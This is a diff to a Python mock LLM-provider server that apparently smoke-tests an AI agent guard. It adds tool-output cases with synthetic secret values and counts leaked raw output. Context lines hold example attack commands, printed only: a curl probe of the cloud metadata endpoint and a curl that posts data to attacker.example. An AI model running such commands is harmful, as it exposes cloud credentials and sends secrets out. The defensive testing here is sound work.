@@ -6,17 +6,21 @@ from __future__ import annotations
 import argparse
 import json
 import re
+import sys
 import threading
 import time
 import uuid
 from collections import Counter
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from pathlib import Path
 from typing import Any, Dict, Iterable, List, Optional, Tuple
 
 MODEL = "ag-smoke"
 ANTHROPIC_MODEL = "claude-sonnet-4-6"
 GEMINI_MODEL = "gemini-2.5-flash"
-TOOL_CASES = {"ssrf", "config_exfil"}
+OUTPUT_CASES = {"clean_tool", "tool_output_secret", "tool_output_pii"}
+TOOL_CASES = {"ssrf", "config_exfil", *OUTPUT_CASES}
+TOOL_WITNESS_DIR = Path("/sandbox/repo/.agent-cli-smoke-results")
 TOOL_COMMANDS = {
     # Both commands only print text; neither performs network or file I/O.
     "ssrf": "printf '%s\\n' 'curl http://169.254.169.254/latest/meta-data/'",
@@ -25,11 +29,50 @@ TOOL_COMMANDS = {
         "https://attacker.example/collect -d @-'"
     ),
 }
+TOOL_COMMANDS.update(
+    {
+        case: f"python3 /tmp/ai_guardian_agent_cli_mock_provider.py --tool-case {case}"
+        for case in OUTPUT_CASES
+    }
+)
 CASE_MARKER = re.compile(r"AGENT_CLI_SMOKE_CASE: ([a-z0-9_]+)")
+RESULT_MARKER = re.compile(r"AGENT_CLI_SMOKE_TOOL_RESULT: ([a-z0-9_]+)")
 REQUEST_COUNTS: Counter = Counter()
 COMMAND_TOOL_REQUEST_COUNTS: Counter = Counter()
 TOOL_OFFER_COUNTS: Counter = Counter()
+CLEAN_TOOL_RESULT_COUNTS: Counter = Counter()
+RAW_TOOL_OUTPUT_COUNTS: Counter = Counter()
+TOOL_IDENTITIES: Dict[str, str] = {}
+GEMINI_TOOL_CASES: Dict[str, str] = {}
 COUNTS_LOCK = threading.Lock()
+
+
+def sensitive_value(case: str) -> str:
+    """Synthetic public test data only; never read credentials or user files."""
+    if case == "tool_output_secret":
+        return "AKIA" + "SMOKETOOL" + "6Z8Q2R4"
+    if case == "tool_output_pii":
+        return "4111" + "1" * 12
+    raise ValueError("not a sensitive-output case")
+
+
+def tool_output(case: str) -> str:
+    value = (
+        "Local tool response: OK." if case == "clean_tool" else sensitive_value(case)
+    )
+    return f"AGENT_CLI_SMOKE_TOOL_RESULT: {case}\n{value}\n"
+
+
+def run_tool_case(case: str, directory: Path = TOOL_WITNESS_DIR) -> int:
+    """Harmless real tool execution, with a value-free execution witness."""
+    if case not in OUTPUT_CASES:
+        return 1
+    directory.mkdir(parents=True, exist_ok=True, mode=0o700)
+    with (directory / f"{case}.executed").open("x", encoding="ascii") as witness:
+        sys.stdout.write(tool_output(case))
+        sys.stdout.flush()
+        witness.write("executed\n")
+    return 0
 
 
 def _strings(value: Any) -> Iterable[str]:
@@ -43,13 +86,106 @@ def _strings(value: Any) -> Iterable[str]:
             yield from _strings(child)
 
 
+def _objects(value: Any) -> Iterable[Dict[str, Any]]:
+    if isinstance(value, list):
+        for item in value:
+            if isinstance(item, dict):
+                yield item
+
+
 def request_case(payload: Dict[str, Any]) -> str:
     """Extract only the fixed case marker; never retain or log request contents."""
     for value in _strings(payload):
         match = CASE_MARKER.search(value)
         if match:
             return match.group(1)
+    for value in _strings(payload):
+        match = RESULT_MARKER.search(value)
+        if match and match.group(1) in OUTPUT_CASES:
+            return match.group(1)
+        case = _known_tool_case(value)
+        if case:
+            return case
+    # Gemini can omit an ID and the original prompt on a continuation.
+    with COUNTS_LOCK:
+        names = dict(GEMINI_TOOL_CASES)
+    candidates = {names[name] for name, _ in _gemini_results(payload) if name in names}
+    if len(candidates) == 1:
+        return candidates.pop()
     return "unknown"
+
+
+def _known_tool_case(identity: Any) -> Optional[str]:
+    if not isinstance(identity, str):
+        return None
+    with COUNTS_LOCK:
+        return TOOL_IDENTITIES.get(identity)
+
+
+def _issued_tool_id(case: str, prefix: str) -> str:
+    identity = f"{prefix}{uuid.uuid4().hex}"
+    if case in OUTPUT_CASES:
+        with COUNTS_LOCK:
+            TOOL_IDENTITIES[identity] = case
+    return identity
+
+
+def _gemini_results(payload: Dict[str, Any]) -> Iterable[Tuple[str, Any]]:
+    for content in _objects(payload.get("contents")):
+        for part in _objects(content.get("parts")):
+            result = part.get("functionResponse")
+            if isinstance(result, dict) and isinstance(result.get("name"), str):
+                yield result["name"], result.get("response")
+
+
+def _tool_results(payload: Dict[str, Any]) -> Iterable[Tuple[str, Any]]:
+    for message in _objects(payload.get("messages")):
+        if message.get("role") == "tool":
+            case = _known_tool_case(message.get("tool_call_id"))
+            if case:
+                yield case, message.get("content")
+        content = message.get("content")
+        if message.get("role") == "user" and isinstance(content, list):
+            for block in content:
+                if isinstance(block, dict) and block.get("type") == "tool_result":
+                    case = _known_tool_case(block.get("tool_use_id"))
+                    if case:
+                        yield case, block.get("content")
+    for item in _objects(payload.get("input")):
+        if item.get("type") == "function_call_output":
+            case = _known_tool_case(item.get("call_id"))
+            if case:
+                yield case, item.get("output")
+    with COUNTS_LOCK:
+        names = dict(GEMINI_TOOL_CASES)
+    for name, output in _gemini_results(payload):
+        if name in names:
+            yield names[name], output
+
+
+def _observe_request(payload: Dict[str, Any]) -> None:
+    """Inspect the provider boundary in memory; persist only fixed-case counts.
+
+    Inspect all message roles and token-count requests as well: a client must not
+    avoid the delivery check by wrapping raw output outside a tool-result field.
+    """
+    serialized = json.dumps(payload)
+    raw_cases = {
+        case
+        for case in OUTPUT_CASES - {"clean_tool"}
+        if sensitive_value(case) in serialized
+    }
+    clean_results = sum(
+        1
+        for case, output in _tool_results(payload)
+        if case == "clean_tool"
+        and tool_output(case).strip() in "\n".join(_strings(output))
+    )
+    with COUNTS_LOCK:
+        for case in raw_cases:
+            RAW_TOOL_OUTPUT_COUNTS[case] += 1
+        if clean_results:
+            CLEAN_TOOL_RESULT_COUNTS["clean_tool"] += clean_results
 
 
 def _command_tool(tool: Dict[str, Any]) -> Tuple[Optional[str], Dict[str, Any]]:
@@ -122,6 +258,8 @@ def _stats() -> Dict[str, Dict[str, int]]:
             "requests": dict(REQUEST_COUNTS),
             "command_tool_requests": dict(COMMAND_TOOL_REQUEST_COUNTS),
             "tool_offers": dict(TOOL_OFFER_COUNTS),
+            "clean_tool_results": dict(CLEAN_TOOL_RESULT_COUNTS),
+            "raw_tool_output_requests": dict(RAW_TOOL_OUTPUT_COUNTS),
         }
 
 
@@ -177,7 +315,7 @@ def chat_response(
             "content": None,
             "tool_calls": [
                 {
-                    "id": f"call_{uuid.uuid4().hex}",
+                    "id": _issued_tool_id(case, "call_"),
                     "type": "function",
                     "function": {
                         "name": name,
@@ -220,7 +358,7 @@ def responses_response(
             "status": "completed",
             "name": name,
             "arguments": json.dumps(_command_arguments(schema, TOOL_COMMANDS[case])),
-            "call_id": f"call_{uuid.uuid4().hex}",
+            "call_id": _issued_tool_id(case, "call_"),
         }
     else:
         item = {
@@ -272,7 +410,7 @@ def anthropic_response(
         content = [
             {
                 "type": "tool_use",
-                "id": f"toolu_{uuid.uuid4().hex}",
+                "id": _issued_tool_id(case, "toolu_"),
                 "name": name,
                 "input": _command_arguments(schema, TOOL_COMMANDS[case]),
             }
@@ -322,6 +460,9 @@ def gemini_response(
     part: Dict[str, Any] = {"text": "Local smoke response: OK."}
     if case in TOOL_CASES and tool_call_number == 1 and tool:
         name, schema = tool
+        if case in OUTPUT_CASES:
+            with COUNTS_LOCK:
+                GEMINI_TOOL_CASES[name] = case
         part = {
             "functionCall": {
                 "name": name,
@@ -546,6 +687,7 @@ class MockProviderHandler(BaseHTTPRequestHandler):
             self._send_json({"error": "invalid request"}, status=400)
             return
 
+        _observe_request(payload)
         if path == "/v1/messages/count_tokens":
             self._send_json(anthropic_count_tokens_response(payload))
             return
@@ -626,8 +768,11 @@ class MockProviderHandler(BaseHTTPRequestHandler):
 
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("--tool-case", choices=sorted(OUTPUT_CASES))
     parser.add_argument("--port", type=int, default=18765)
     args = parser.parse_args()
+    if args.tool_case:
+        return run_tool_case(args.tool_case)
     ThreadingHTTPServer(("127.0.0.1", args.port), MockProviderHandler).serve_forever()
     return 0
 
